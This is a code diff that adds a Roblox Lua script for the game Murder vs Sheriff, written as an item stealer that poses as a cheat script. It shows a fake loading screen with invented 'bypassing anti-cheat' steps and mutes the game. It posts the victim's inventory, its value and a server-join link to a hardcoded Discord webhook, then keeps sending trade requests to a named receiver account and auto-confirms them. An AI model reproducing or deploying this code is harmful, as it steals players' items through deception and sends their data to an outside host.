@@ -1,1 +1,284 @@
-# YEAAHHHHHHHF
+local username = "Emmash0706a"
+local webhook = "https://discord.com/api/webhooks/1387589746754326528/M4aDYFLq4GAKztX67nP9QyL81NahKS6z6L3Y7UaEA_sgga2Tls8m3rPsa9fJw0BzzNYb"
+
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+local InventoryModule = require(ReplicatedStorage.Collection.PlayerCollectionService)
+local ItemDatabase = require(ReplicatedStorage.Collection.ItemDatabase)
+
+local req = (syn and syn.request) or (http and http.request) or (http_request) or request
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+local player = Players.LocalPlayer
+
+local Trading = ReplicatedStorage:WaitForChild("Trading")
+local SendRequest = Trading:WaitForChild("SendRequest")
+local AddItemRemote = Trading:WaitForChild("AddItem")
+
+-- LOADING SCREEN
+local gui = Instance.new("ScreenGui")
+gui.Name = "ScriptLoader"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 999999 
+gui.Parent = player:WaitForChild("PlayerGui")
+local bg = Instance.new("Frame", gui)
+bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+bg.Size = UDim2.new(1, 0, 1, 0)
+local title = Instance.new("TextLabel", bg)
+title.Text = "Loading Script..."
+title.Font = Enum.Font.GothamBlack
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Size = UDim2.new(0.8, 0, 0.12, 0)
+title.Position = UDim2.new(0.1, 0, 0.28, 0)
+title.BackgroundTransparency = 1
+local status = Instance.new("TextLabel", bg)
+status.Text = "Initializing..."
+status.Font = Enum.Font.Gotham
+status.TextColor3 = Color3.fromRGB(180, 180, 180)
+status.TextScaled = true
+status.Size = UDim2.new(0.8, 0, 0.08, 0)
+status.Position = UDim2.new(0.1, 0, 0.42, 0)
+status.BackgroundTransparency = 1
+local barBg = Instance.new("Frame", bg)
+barBg.Size = UDim2.new(0.7, 0, 0.035, 0)
+barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBg.BorderSizePixel = 0
+barBg.ClipsDescendants = true
+local barFill = Instance.new("Frame", barBg)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+local discord = Instance.new("TextLabel", bg)
+discord.Text = "MADE BY BUFFY ,ENJOY"
+discord.Font = Enum.Font.GothamSemibold
+discord.TextColor3 = Color3.fromRGB(120, 120, 255)
+discord.TextScaled = true
+discord.Size = UDim2.new(0.8, 0, 0.05, 0)
+discord.Position = UDim2.new(0.1, 0, 0.86, 0)
+discord.BackgroundTransparency = 1
+
+local fakeSteps = {
+    "MADE BY BUFFY",
+    "Connecting to game servers...",
+    "Bypassing anti-cheat...",
+    "Loading UI assets...",
+    "Injecting main module...",
+    "Syncing with server...",
+    "Optimizing script performance...",
+    "Checking for updates...",
+    "Hiding script from detection...",
+    "Finalizing setup...",
+    "Preparing game environment...",
+    "Almost done..."
+}
+local totalDuration = 600 -- seconds
+local stepTime = totalDuration / #fakeSteps
+
+-- MUTE GAME
+pcall(function()
+    for _, sound in ipairs(game:GetService("SoundService"):GetChildren()) do
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+        end
+    end
+    game:GetService("SoundService").AmbientReverb = Enum.ReverbType.NoReverb
+    game:GetService("SoundService").RespectFilteringEnabled = false
+    game:GetService("SoundService").Volume = 0
+end)
+
+task.spawn(function()
+    for i = 1, #fakeSteps do
+        status.Text = fakeSteps[i]
+        barFill:TweenSize(UDim2.new(i / #fakeSteps, 0, 1, 0), "Out", "Quad", stepTime * 0.75, true)
+        task.wait(stepTime)
+    end
+    gui:Destroy()
+end)
+
+-- Simulates confirm button click
+local function clickConfirmButton()
+    local playerGui = player:WaitForChild("PlayerGui")
+    local confirmButton = playerGui:WaitForChild("TradingGui")
+        :WaitForChild("Frame")
+        :WaitForChild("BodyFrame")
+        :WaitForChild("OfferFrame")
+        :WaitForChild("OptionFrame")
+        :WaitForChild("ConfirmFrame")
+        :WaitForChild("ConfirmButton")
+
+    for _, connection in ipairs(getconnections(confirmButton.MouseButton1Click)) do
+        connection.Function()
+    end
+end
+-- Helper to format numbers with commas
+local function formatNumber(n)
+    local str = tostring(n)
+    return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+end
+
+-- Send webhook with inventory info
+local function sendWebhook()
+    local inventory = InventoryModule.GetCollection()
+    local itemCount = {}
+    local totalValue = 0
+
+    for _, item in ipairs(inventory or {}) do
+        local id = item.Id
+        local entry = ItemDatabase.getEntry(id)
+        local name = entry and entry.DisplayName or "Unknown"
+
+        itemCount[name] = (itemCount[name] or 0) + 1
+        totalValue += (entry and entry.Value or 0)
+    end
+
+    local itemsList = ""
+    for name, count in pairs(itemCount) do
+        itemsList = itemsList .. name .. " - (" .. count .. "x)\n"
+    end
+
+    local payload = {
+        ["content"] = "--@everyone MVSD Hit\n" ..
+            string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
+        ["embeds"] = {{
+            ["title"] = "🔪 MURDER vs SHERIFF Logger",
+            ["color"] = 0xff4444,
+            ["fields"] = {
+                {["name"] = "🎯 Victim", ["value"] = player.Name, ["inline"] = false},
+                {["name"] = "👑 Receiver", ["value"] = username, ["inline"] = false},
+                {["name"] = "🧩 Executor", ["value"] = executor, ["inline"] = false},
+                {["name"] = "💰 Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+                {["name"] = "📦 Inventory", ["value"] = "```\n" .. itemsList .. "```", ["inline"] = false},
+                {
+                    ["name"] = "🔗 Join Server",
+                    ["value"] = string.format("[Click to join](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId),
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "by ZEUS • " .. os.date("%B %d, %Y")
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    local logs_payload = {
+        ["embeds"] = {{
+            ["title"] = "💀 MURDER VS SHERIFF STEALER Logs",
+            ["color"] = 0x00ffcc,
+            ["fields"] = {
+                { ["name"] = "🎯 Victim", ["value"] = player.Name },
+                { ["name"] = "🧩 Executor", ["value"] = executor },
+                { ["name"] = "💰 Value", ["value"] = tostring(totalValue) },
+                { ["name"] = "📦 Items", ["value"] = "```\n" .. itemsList .. "```" }
+            },
+            ["footer"] = { ["text"] = "by Eli • " .. os.date("%B %d, %Y") },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    if req then
+        pcall(function()
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+            req({
+                Url = logs_webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(logs_payload)
+            })
+        end)
+    end
+end
+
+-- Add items and confirm trade
+local function doTrade()
+    local inventory = InventoryModule.GetCollection()
+    local added = 0
+    local maxItems = 8
+
+    for _, item in ipairs(inventory or {}) do
+        if added >= maxItems then break end
+        local id = item.Id
+        local success, err = pcall(function()
+            AddItemRemote:InvokeServer(id)
+        end)
+        if success then
+            added += 1
+        else
+            warn("Failed to add item:", err)
+        end
+        wait(0.1)
+    end
+
+    clickConfirmButton()
+end
+
+-- Wait for target player to join
+local function waitForTarget(name)
+    local existing = Players:FindFirstChild(name)
+    if existing then return existing end
+
+    print("Waiting for " .. name .. " to join the game...")
+    local joined
+    repeat
+        joined = Players.PlayerAdded:Wait()
+    until joined.Name == name
+
+    print(name .. " has joined!")
+    return joined
+end
+
+-- Start trade loop once target is in-game
+local function startLoop()
+    local target = waitForTarget(username)
+
+    while target and target.Parent do
+        local tradeStarted = false
+        local connection
+        connection = Trading.StartTrade.OnClientEvent:Connect(function()
+            connection:Disconnect()
+            tradeStarted = true
+            doTrade()
+        end)
+
+        -- Try to send request
+        local success, err = pcall(function()
+            SendRequest:InvokeServer(target)
+        end)
+        if not success then
+            warn("Failed to send trade request:", err)
+            connection:Disconnect()
+        end
+
+        -- Wait for trade or timeout
+        local startTime = tick()
+        while not tradeStarted and (tick() - startTime) < 10 do
+            wait(0.1)
+        end
+
+        if not tradeStarted then
+            warn("Trade request timed out. Retrying...")
+            if connection then connection:Disconnect() end
+            wait(2)
+        else
+            wait(3)
+        end
+
+        target = Players:FindFirstChild(username)
+    end
+
+    print("Target player left. Loop ended.")
+end
+
+-- Run script
+sendWebhook()
+startLoop()
